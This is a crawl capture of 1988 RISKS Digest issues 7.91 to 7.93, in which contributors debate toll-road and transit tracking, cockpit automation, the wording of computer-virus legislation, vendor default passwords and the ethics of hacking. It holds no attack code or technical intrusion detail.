non-descriptness of these black boxes makes it easy for a thief to replace a
stolen tag with a functionless dummy, so that it could be some time before the
victim even realizes the unit had been stolen, by which time the thief could
have run up quite a bill for the victim.

The greatest RISK posed by these units is that the subjects in the current
experiment seem to unanimously love the idea.  Just breeze through a toll-plaza
-- great! It never occurs to the average technology-ignorant, computer-phobic
user that there may be some serious security/privacy problems here.  I think
some sort of high-publicity demonstration of the flaws in this system are
called for as soon as possible.

Bob Glickstein, Information Technology Center, Carnegie Mellon University,
Pittsburgh, PA

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 [Dave Nedde: Re: Toll Road information collection]
</A>
</H3>
<address>
    Brint Cooper 
&lt;<A HREF="mailto:abc@BRL.MIL">
abc@BRL.MIL
</A>&gt;
</address>
<i>
Sat, 3 Dec 88 22:42:07 EST
</i><PRE>

Dave Nedde quotes David Oster:

&gt;&gt;From: oster@dewey.soe.Berkeley.EDU (David Phillip Oster)
&gt;&gt;Is it fair to also stamp the tickets with the time of issue, so if the
&gt;&gt;distance traveled divided by the time elapsed is greater than the average
&gt;&gt;speed limit the toll taker can hand you a speeding ticket at the same time?
&gt;&gt;An appropriate computer would help the toll taker in this task.

Then he adds:

&gt;Alas, as a Mass police officer pointed out in an interview, you have to catch
&gt;someone *in the act* of speeding to get them for it.  Probably something to do
&gt;with that annoying bill of rights...

I seriously doubt that the Mass. police officer is absolutely correct.  After
all, a favorite FBI strategy in catching professional hoodlums was to
prosecute, successfully on income tax evasion.  The evidence often was nothing
more than a cash flow analysis:  showing that someone spent more money in one
year than he reported as income! Convictions were upheld, no?

Risk of computers?  Sure; think how often sucn analyses are possible
using computers:  proving Medicaid fraud, failure to repay student
loans, catching scofflaws who replace a revoked driver's licence in one
state with a "good" one in another, etc.

Perhaps we should  call this "benefits of computers?"
                                                            _Brint
	
</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Toll Road information collection
</A>
</H3>
<address>
Scott E. Preece
&lt;<A HREF="mailto:preece@xenurus.gould.com ">
preece@xenurus.gould.com 
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 09:48:28 CST
</i><PRE>

  From: Dave Nedde &lt;daven@weathertop.prime.com&gt;
&gt; Alas, as a Mass police officer pointed out in an interview, you have to
&gt; catch someone *in the act* of speeding to get them for it.  Probably
&gt; something to do with that annoying bill of rights...

I suspect it would be trivial to modify the law if it in fact prohibits such an
application now.  The state has very broad discretion in controlling the use of
public roads and the privileges and responsibilities of those who hold state
licenses (they could make it a license requirement to report illegal traffic
behavior and then fine all licensed drivers in a car known to have been
speeding, if they chose to make the statutes work that way).  I don't see any
way the Bill of Rights is even remotely involved.

scott preece, motorola urbana design center uucp: uunet!uiucuxc!mcdurb!preece

</PRE>
<HR><H3><A NAME="subj7.2">
Re: Toll Road information collection
</A>
</H3>
<address>
&lt;<A HREF="mailto:sullivan@fine.Princeton.EDU">
sullivan@fine.Princeton.EDU
</A>&gt;
</address>
<i>
Sun, 4 Dec 88 14:13:39 EST
</i><PRE>

There was discussion of this in another newsgroup not too long ago.  Someone
pointed out that exiting the toll road with average speed greater than the
speed limit does not prove you were driving over the speed limit, since you
might have switcherd drivers.  Maybe this defense would indeed hold up--I no
lawyer--but I see no reason not to pass a new law to make exiting with too
little elapsed time a new crime.  The owner of a car can be held responsible
for parking tickets even if someone else parked the car, so I see no reason
that whoever drives through the exit booth can't be held responsible for the
average speed.
                                        John Sullivan

</PRE>
<HR><H3><A NAME="subj7.3">
re: Subways that "know" who's on board
</A>
</H3>
<address>
&lt;<A HREF="mailto:Hibbert.pa@Xerox.COM">
Hibbert.pa@Xerox.COM
</A>&gt;
</address>
<i>
Wed, 7 Dec 88 11:01:16 PST
</i><PRE>

Regarding the item about the philadelphia subway system's capability to
track monthly pass-holders' movement:

I'm not particularly worried about this as an invasion of privacy, as long as
purchasers don't have to identify themselves when buying their passes.  It
sounds to me as if the data they could collect doesn't contain any
identification of individuals.  It doesn't seem problematic for the transit
commision to be able to gather statistics on individual traveller's routes, as
long as there's no ability to tie the information to who the traveller is.

I confess that I don't see a usefull way to correlate information on
different trips by the same individual.  The most usefull information would
be just what the starting and stopping points were.  Without this tracking
ability, they presumably can't tell what the distribution of trip lengths
is, and there are probably ways to make use of that information.

Oh, I guess there might be a privacy problem if there is real-time feedback
from the tracking system.  For instance, if some police officer decides
that lots of short trips throughout the day (as an example) is
characteristic of some type of criminal of interest, it would be a problem
if there were a way to find out real-time that someone fitting that
description were right now passing through a particular turnstile.  

Other than that possible hole, this seems like an example of a way to gather
data that starts out as a description only of average or sample behavior.  As I
said, all this is wrong if users identify themselves when they buy their
passes.
                                   Chris

    [Well, many people pay by check or credit card, and that information would
     of course have to be recorded, for bookkeeping reasons...  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.90.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.92.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-44</DOCNO>
<DOCOLDNO>IA012-000131-B036-85</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.92.html 128.240.150.127 19970217024440 text/html 26274
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:43:03 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 92</TITLE>
<LINK REL="Prev" HREF="/Risks/7.91.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.93.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.91.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.93.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 92</H1>
<H2> Monday 12 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Glass cockpits 
</A>
<DD>
<A HREF="#subj1.1">
Randall Davis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  "Proper British Programs" 
</A>
<DD>
<A HREF="#subj2.1">
Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Information available for a price 
</A>
<DD>
<A HREF="#subj3.1">
Curtis Keller and Bruce O'Neel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Toll Road information collection 
</A>
<DD>
<A HREF="#subj4.1">
Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Big Bother and Computer Risks 
</A>
<DD>
<A HREF="#subj5.1">
Dennis L. Mumaugh
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Computer Virus Eradication Act of 1988 
</A>
<DD>
<A HREF="#subj6.1">
Jonathan Sweedler
</A><br>
<A HREF="#subj6.2">
 Vince Manis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Vendor Liability and "Plain Vanilla" configurations 
</A>
<DD>
<A HREF="#subj7.1">
Andy Goldstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: "Hackers", "crackers", "snackers", and ethics 
</A>
<DD>
<A HREF="#subj8.1">
Andy Goldstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Hackers 
</A>
<DD>
<A HREF="#subj9.1">
Shatter
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Glass cockpits (Rodney Hoffman, <A HREF="/Risks/7.90.html">RISKS-7.90</A>)
</A>
</H3>
<address>
Randall Davis
&lt;<A HREF="mailto:davis@wheaties.ai.mit.edu ">
davis@wheaties.ai.mit.edu 
</A>&gt;
</address>
<i>
Sun, 11 Dec 88 16:23:32 EST
</i><PRE>

The article [Peril for Pilots]  raises two interesting issues:

The larger issue is, what kinds of and how much remote sensing to use, what
kinds of and how much automation to introduce in any situation.  Note, though,
that the problem of information overload and believing sensors (including your
own eyes) has been with us for quite some time and exists /independent of/
automation in general and computers in particular.  Both of those can easily
ADD to the problem, but that's different from being the SOURCE of it.

Second, it is another example of the remarkably unsuccessful attempt to cast
technology as the primary heavy in the Vincennes incident.  When it first
happened we saw a remarkable flood of messages to Risks speculating about the
role of advanced automation in general and computers in particular as central
to this disaster.  When the report came out indicating that the system had
supplied accurate information, the silence was deafening.

And now this (continuing from the same msg above):

    "The anti-air warfare officer made no attempt to confirm the reports [...]
    Instead, this "experienced and highly qualified officer [...] relied on
    the judgment of one or two second-class petty officers, buttressed by
    his own preconceived perception of the threat, and made an erroneous
    assessment to his commanding officer."

In other words, if only the AA Officer had &gt;&gt;paid attention to the system and
believed it instead of or along with his ``one or two ... officers,''&lt;&lt; the
tragedy would have been avoided.

Can automation and reliance on remote sensing be overdone?  Of course.  Is
this an example of it, or an example of the opposite?

The point is not that technology is blameless, nor that this particular
technology is faultless, nor that the sole issue is the effectiveness of the
technology (political, ethical, military and other considerations all play a
role in this).

The point is twofold: 
first, within almost any reasonable definition, the system worked to supply
accurate and useful information in a form available in a ``quick reference'';
every report that comes out continues to make that clear.

second, there is, with only a few exceptions, clearly a strong desire in the
Risks community to believe otherwise.  Perhaps that's worth a few minutes
reflection.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
"Proper British Programs" (Nancy Leveson, <A HREF="/Risks/7.91.html">RISKS-7.91</A>)
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Mon, 12 Dec 88 13:15:22 PST
</i><PRE>

&gt;the ICAO must certify these systems before they are used, the standard has
&gt;teeth and could be enforced quite strictly (unlikely, but ...). The following 
&gt;are some interesting excerpts:

&gt;  "... [Software] must be developed systematically in such a way that its
&gt;   behavior, under all possible conditions, can be established by logical
&gt;   reasoning (to a level of formality appropriate to the application).

   It's my opinion that strict enforcement of the above requirement simply
makes the developer liable for errors, but doesn't do much for actually
improving software reliability.  It is unlikely that "all possible conditions"
can be forseen, let alone provided for.  The problem becomes bigger as the
complexity of the system increases, to the point where exhaustive analysis of a
system could take centuries to perform.

   The requirement is essentially that systems be perfect.  That goal has
proven elusive (unattainable?) in all areas of human endeavor.  Extensive
formalism and verification should be required of critical systems, but
requirements for perfect function are inane.  A better approach would be to
require independent performance monitoring and evaluation as part of the
complete system.  This is the approach we often take with non-computer based
systems.  It seems reasonable to make it part of our imbeded computer systems
as well.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Toll Road information collection (John Sullivan, <A HREF="/Risks/7.91.html">RISKS-7.91</A>)
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Mon, 12 Dec 88 13:15:22 PST
</i><PRE>

John Sullivan (sullivan@fine.Princeton.EDU) writes about fines for speeding 
based on computed speed from toll both timing:

&gt;            ...          I'm no
&gt;lawyer--but I see no reason not to pass a new law to make exiting with too
&gt;little elapsed time a new crime.  The owner of a car can be held responsible
&gt;for parking tickets even if someone else parked the car, so I see no reason
&gt;that whoever drives through the exit booth can't be held responsible for the
&gt;average speed.

   A parking violation does not go on a person's driving record.  It does not
matter who was cited as long as the bill is paid.  So, if you lend your car to
a friend who then get's a parking ticket, you can collect from him with no
negative impact on your record.  However, a speeding ticket does end up on a
specific person's record, and thus can result in the suspension of that
person's driving priveleges, and can have a significant impact on his/her
insurance rates, etc.  This makes it quite important to assign the ticket to
the driver and not just the vehicle.  This scheme does not address this
concern, hence it is unreasonable.
						Steve Philipson

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Big Bother and Computer Risks
</A>
</H3>
<address>
&lt;<A HREF="mailto:dlm@cuuxb.att.com">
dlm@cuuxb.att.com
</A>&gt;
</address>
<i>

</i><PRE>

In reference to RISKS DIGEST 7.91, Robert Steven Glickstein
&lt;bobg+@andrew.cmu.edu&gt; and others have been discussing Toolbooths
and other risks of automated monitoring.

This subject has been extensively treated by Science Fiction writers,
especially Mack Reynolds who postualed the Coporate State with a cashless
society.  All transactions were done with a single money card.

One story especially instructive involved a "criminal".  He tried to rob a
person and it was pointed out that the card was useless without the owner as
personal identfication [e.g. retinal prints, etc.] were necessary to use the
card.  Our protagonist grabs the person, etc.

The police give chase and they are tracking the crook by observing the use of
the card, and where it is used.  Later they watch him use the Mass-Transit
system and can track him to the gate and car.

The end of the story concludes that the "crook" is a cracker to test how easy
it was to break the system and how long it would take for police to catch such
a person.

Interesting points were that the tracking mechanism was built into the computer
systems and could be activated on a widespread basis by a simple command from a
computer.  Our risk is that such capabilities could be designed into any new
cashless machine either as a conscious feature or as a debug switch for
testing.

I suspect that the case of life imitating art is close at hand and readers of
the risks list ought to go back and check out some early Science Fiction as
well as the latest Computer stories including the so-called cyber-punk
movement.

=Dennis L. Mumaugh
 Lisle, IL       ...!{att,lll-crg}!cuuxb!dlm  OR cuuxb!dlm@arpa.att.com

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Information available for a price
</A>
</H3>
<address>
&lt;<A HREF="mailto:keller@ficc.UUCP">
keller@ficc.UUCP
</A>&gt;
</address>
<i>
Wed Dec  7 20:29:48 1988
</i><PRE>

I received a postcard in the paper mail from a company called Credit Checker 
and Nationwide SS#- Locate.    Apparently anyone can -

  o Take a lot of risk out of doing business.
  o Check the credit of anyone, anywhere in the United States
  o Pull Automobile Drivers License information from 49 states
  o Trace people by their Social Security Number

By "Using ANY computer with a modem!"

To subscribe to this unique 24-hour on-line network call 1-800-255-6643.

Hmmm, I wonder if my neighbor with the new 928 : can really afford it 
       and how many traffic tickets does he have....

Curtis Keller 

     [Also noted on 12 Dec 88 by Bruce O'Neel &lt;XRBEO@SCFVM.GSFC.NASA.GOV&gt;]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Computer Virus Eradication Act of 1988
</A>
</H3>
<address>
Jonathan Sweedler
&lt;<A HREF="mailto:cjosta@taux01.UUCP ">
cjosta@taux01.UUCP 
</A>&gt;
</address>
<i>
12 Dec 88 07:42:38 GMT
</i><PRE>
Organization: National Semiconductor (Israel) Ltd.

From what I have read of the laws and bills dealing with computer
viruses and computer trespassers, it seems that someone can only be
prosecuted if they "cause harm" to a computer.  Even the new Computer
Virus Eradication Act of 1988 doesn't seem to apply to a person who
enters a computer without authorization just to browse through
directories.  Even part two of the below quote from the act may be
circumvented by simply announcing that you have entered the computer!
It seems that Robert Morris Jr. would not have done anything illegal
(even under these new bills) if his virus had worked as it was designed
to work: to propagate quietly from machine to machine.

&gt;7         "(a) Whoever knowingly-
&gt;8             "(1) inserts into a program for a computer infor-
&gt;9           mation or commands, knowing or having reason to be-
&gt;10          lieve that such information or commands will cause
&gt;11          loss to users of a computer on which such program is
&gt;12          run or to those who rely on information processed on
&gt;13          such computer; and
&gt;14            "(2) provides such a program to others in circum-
&gt;15          stances in which those others do not know of the inser-
&gt;16          tion or its effects;

In other words, can I break into any computer I want to and look at
whatever files I want to, as long as I announce I'm there and don't
cause any harm?  Why do these laws center on causing harm to computers
and not just illegal/unauthorized entry?

Jonathan Sweedler  ===  National Semiconductor Israel
Domain:  cjosta@taux01.nsc.com

</PRE>
<HR><H3><A NAME="subj6.2">
Computer Virus Eradication Act of 1988  (<A HREF="/Risks/7.91.html">RISKS-7.91</A> from VIRUS-L)
</A>
</H3>
<address>
Vince Manis
&lt;<A HREF="mailto:manis@grads.cs.ubc.ca ">
manis@grads.cs.ubc.ca 
</A>&gt;
</address>
<i>
Mon, 12 Dec 88 12:22:54 PST
</i><PRE>
Organization: UBC Department of Computer Science, Vancouver, B.C., Canada

&gt;From: Don Alvarez &lt;boomer@space.mit.edu&gt;
&gt;Subject: Computer Virus Eradication Act of 1988
&gt;1    SECTION 2. TITLE 18 AMENDMENT.
&gt;2          (a) IN GENERAL.- Chapter 65 (relating to malicious
&gt;3    mischief) of title 18, United States Code, is amended by
&gt;4    adding at the end the following:
&gt;5    "S 1368.  Disseminating computer viruses and other harm-
&gt;6              ful computer programs
&gt;7         "(a) Whoever knowingly-
&gt;8             "(1) inserts into a program for a computer infor-
&gt;9           mation or commands, knowing or having reason to be-
&gt;10          lieve that such information or commands will cause
&gt;11          loss to users of a computer on which such program is
&gt;12          run or to those who rely on information processed on
&gt;13          such computer; and
&gt;14            "(2) provides such a program to others in circum-
&gt;15          stances in which those others do not know of the inser-
&gt;16          tion or its effects;
&gt;17   or attempts to do so, shall if any such conduct affects
&gt;18   interstate or foreign commerce, be fined under this title or
&gt;19   imprisoned not more than 10 years, or both.

The idea sounds great to me.  However, the wording has problems. I'm
not a lawyer, but the text above appears to make it illegal to provide
a delete file routine in an operating system; it also makes the GNU
Emacs 'dissociated-press' function illegal.

What seems to be missing here is a proper definition of the terms
'virus' and 'worm'. Presumably, the problems with such programs
are that: (a) they install themselves into computer systems surreptitiously,
(b) they operate without the user asking them to do so, and (c) [viruses
only] they damage user data. I don't think the above wording addresses these
issues. There's also a question of intentionality: if a system includes a
`Grim Reaper', which deletes all files not referenced within a certain
period of time, and a user does not know about the G.R., are the
implementors of the system, or the operations staff on that machine,
responsible for the disappearance of files?

I consider it a RISK when legislators introduce bills on technological
matters which may not really address the issue at hand. I remember Rep. Jack
Brooks writing letters to Sigplan Notices about 20 years ago on why PL/I was
a poorer language than Fortran and Cobol, for example.  It is our job as
technical people to advise legislators on such issues.

Of course, as a Canadian, why should I care...? :-)

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: Vendor Liability and "Plain Vanilla" configurations
</A>
</H3>
<address>
Andy Goldstein
&lt;<A HREF="mailto:goldstein%star.DEC@src.dec.com ">
goldstein%star.DEC@src.dec.com 
</A>&gt;
</address>
<i>
12 Dec 88 14:02
</i><PRE>

&gt; From: "FIDLER::ESTELL" &lt;estell%fidler.decnet@nwc.arpa&gt;
&gt; [...] By analogy, DEC could ship VMS with all the passwords "expiring" most
&gt; ESPECIALLY those on "privileged" accounts [e.g., System, Operator], and then 
&gt; go into a "closed loop" that could be exited only after the "user" [system, 
&gt; or operator, in this case] selected and installed a *computer generated* 
&gt; password.  ONLY then could the installation be completed ....

We've been doing that for a couple of years. All the standard passwords are
set up pre-expired, and the installation prompts for new passwords on all
the standard accounts (and rejects the standard values). The only thing we
don't do is to generate the passwords; the password generator was considered
too controversial. (The French really hate it because the letter frequency
is all wrong.) The biggest problem is that once you've installed a system,
there are ways of cloning the system disk that circumvent the standard
installation procedure. I feel it's still the most effective thing we've
ever done for system security.

There are some other things that aren't as tight as we would like them in
the out-of-the-box system; we're working on those. Thanx for your kind
words; we keep trying.
					- Andy Goldstein  VMS Development

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: "Hackers", "crackers", "snackers", and ethics
</A>
</H3>
<address>
Andy Goldstein
&lt;<A HREF="mailto:goldstein%star.DEC@src.dec.com ">
goldstein%star.DEC@src.dec.com 
</A>&gt;
</address>
<i>
12 Dec 88 11:48
</i><PRE>

Douglas Jones points out some experiences with benign hacking in the
1970's, in which the efforts of friendly hackers helped improve the
overall system. He expresses regret at the current attitude of treating
all hackers as criminals.

I have had productive working relationships with hackers in the past,
much to be benefit of my company's products, and I continue to maintain
some of these relationships. However, this only works in some environments.
Constructive hacking makes sense in universities and some development
environments, where the hackers belong to the organization that operates
the computer systems, giving them a certain level of trustworthiness.
In addition, the data in such systems is not terribly valuable, and
the occasional disruptions in service are a nuisance and no more.

With the majority of hacking nowadays, things are quite different.
Many of the computer systems involved are crucial to a business's
operation; some are critical to human life. The potential (and in some
cases the actuality) is there for major losses from disruption of
service and theft. The hackers are unknown outsiders in whom a serious
organization can place no trust whatsoever. Today's hackers do not
report what they find. Rather, they steal an organization's data and
services. They leave trap doors for themselves so they can re-enter
the system after it has been ostensibly secured. They are, simply put,
electronic joyriders and vandals.

I am all in favor of constructive hacking, but it should be confined to safe
places. Those who enter systems used for sensitive purposes should be
prosecuted for the tresspass they have committed. [Easier said than done, of
course, which is one of our biggest problems.]
     					        Andy Goldstein, VMS Development

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Hackers
</A>
</H3>
<address>
Shatter
&lt;<A HREF="mailto:unido!altger!Shatter@uunet.UU.NET ">
unido!altger!Shatter@uunet.UU.NET 
</A>&gt;
</address>
<i>
11 Dec 88 19:24:12 MEZ (Sun)
</i><PRE>

Well it is nice to at last see a responcible and inteligent attitude
to hackers in risks (thnx Kenny), But i feel that it is time that an
active hacker had some form of input into the current debate.

Before I get down to my arguements about hackers and hacking perhaps I
should say a few words about myself and why I feel qualified to make my
views known.[I expect I will get flamed alot after this]

Some of you may have already heard of me via articles in the WALL STREET
JOURNAL, NEW YORK DAILY NEWS etc but for those of you who don't read or have
access to copies of these newspapers I am a hacker of over 10 years activity
who is based near Nottingham, England My speciality are the various packet
switched networks around the world such as PSS,Telepac,Transpac etc with
various forays into UN*X,NOS/VE VMS,VM/SP CMS (HPO) etc.[by the way I apologise
for any spelling mistakes but my spelling is very bad as I am dyslecxic]

I feel that as a hacker with so much activity and expirience I am qualified to
make the following points on behalf of the whole hacking community.

Hackers are not the vandals and common criminals you all think we are in fact
most of the "TRUE" hackers around have a genuine respect and love for all forms
of computers and the data that they contain and we are as a community very
responcible and dedicated to the whole idea of IT but we also have a strong
dislike to the abuse of IT that is perpitrated by various governments and
organisations either directly or indirectly.  There is of course a small
minority of so called hackers who do cause trouble and crash systems or steal
money etc but these people on the whole are dealt with by other hackers in away
that most of you could not even think of and most never repeat their "crimes"
again.

In risks recently you have all been very busy discussing what names to use for
hackers and you all seem to be mssing the point. The term "HACKER" is still one
to be very proud of and I am sure that in your younger days you were all called
hackers and were very proud of the fact that someone felt that you had a great
technical expertise that warrented the use of the term, But you all suffer from
the standard problem that nearly all people involved within IT have and that is
of non communication. You never pass on the information that you pickup and
learn to others within IT [American Government organisations and Educational
Institutes are among the greatest offenders] and this allows the hacking
community [who do communicate] to be at least one step ahead of the system
administrators when it comes to finding security problems and finding the cause
and fix for the problem. A case in point is the recent arpanet worm and the FTP
bug both these problems have been known for many months if not years but when
talking to various system administrators recently not one of them had been
informed about them and this left their systems wideopen even though they had
done all they could to secure them with the information they had.  [An
interesting piece of information is that hackers in england knew about Morris's
worm at least 12 hours before it became public knowledge and although England
was not able to be infected due to the hardware in use we were able to inform
the relevent people and patrol internet to janet gateways to look for any
occurance of the worm and therefore we performed a valuble service to the
computing community in England -- although we did not get any thanks or
acknowledgement for this service.]  [but i am straying] Hackers should be
nurtured and helped to perform wot they consider a hobby [ you may do a
crossword as an intelectual challenge -- I study computers and learn about how
things interact together to function correctly (or incorrectly as the case may
be)] and the use of a group of hackers in a "HACK ATTACK" ((c) Kenny 1988) can
perform a valuable service and find problems that most of you could not even
start to think of or would even have the inclination to look for.

So please don't treat us like lepers and paupers find yourself a "TAME" hacker
and show him the respect he deserves and he will perform a valuble service for
you and above all COMMUNICATE with each other don't keep information to
yourselves if you have found it the chances are that so has someone else and
horror apon horror it may be a HACKER

Bst Rgrds 
Shatter

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.91.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.93.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-45</DOCNO>
<DOCOLDNO>IA012-000131-B036-117</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.93.html 128.240.150.127 19970217024454 text/html 27071
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:43:21 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 93</TITLE>
<LINK REL="Prev" HREF="/Risks/7.92.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.94.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.92.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.94.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 93</H1>
<H2> Tuesday 13 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Overrides of train controls in Japan 
</A>
<DD>
<A HREF="#subj1.1">
Jeff Schriebman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Vincennes and over-reliance on automation 
</A>
<DD>
<A HREF="#subj2.1">
Victor Riley
</A><br>
